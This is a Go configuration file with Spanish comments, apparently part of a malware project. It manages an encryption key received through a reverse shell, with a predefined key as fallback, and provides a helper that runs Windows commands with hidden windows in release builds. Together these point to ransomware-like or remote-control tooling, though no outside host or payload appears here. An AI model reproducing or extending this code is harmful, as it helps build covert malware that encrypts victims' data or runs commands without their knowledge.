package config

import (
	"fmt"
	"os/exec"
	"sync"
	"syscall"
)

var (
	// Variables para clave de encriptación dinámica desde reverse shell
	receivedEncryptionKey string
	keyMutex              sync.RWMutex
	keyReceived           bool
)

// DebugPrint imprime mensajes solo si el modo debug está habilitado
func DebugPrint(format string, args ...interface{}) {
	if EnableDebugMode {
		fmt.Printf(format, args...)
	}
}

// DebugPrintln imprime mensajes con salto de línea solo si el modo debug está habilitado
func DebugPrintln(args ...interface{}) {
	if EnableDebugMode {
		fmt.Println(args...)
	}
}

// SetEncryptionKey establece la clave de encriptación recibida desde reverse shell
func SetEncryptionKey(key string) {
	keyMutex.Lock()
	defer keyMutex.Unlock()
	receivedEncryptionKey = key
	keyReceived = true
	DebugPrintln("[+] Clave de encriptación recibida desde reverse shell")
}

// GetEncryptionKey devuelve la clave de encriptación apropiada
func GetEncryptionKey() string {
	if EnableReverseShell {
		keyMutex.RLock()
		defer keyMutex.RUnlock()
		if keyReceived {
			return receivedEncryptionKey
		}
		return "" // Sin clave disponible aún
	}
	return EncryptionKey // Usar clave predefinida si reverse shell está deshabilitado
}

// IsKeyReady indica si la clave está lista para usar
func IsKeyReady() bool {
	if !EnableReverseShell {
		return true // Si reverse shell está deshabilitado, siempre usar clave predefinida
	}
	keyMutex.RLock()
	defer keyMutex.RUnlock()
	return keyReceived
}

// CreateHiddenCommand crea un comando que no muestra ventana en Windows
func CreateHiddenCommand(name string, args ...string) *exec.Cmd {
	cmd := exec.Command(name, args...)

	// En modo debug NO ocultar ventana para poder ver qué pasa
	if !EnableDebugMode {
		// Ocultar ventana en Windows solo en modo release
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x08000000, // CREATE_NO_WINDOW
		}
	}

	return cmd
}
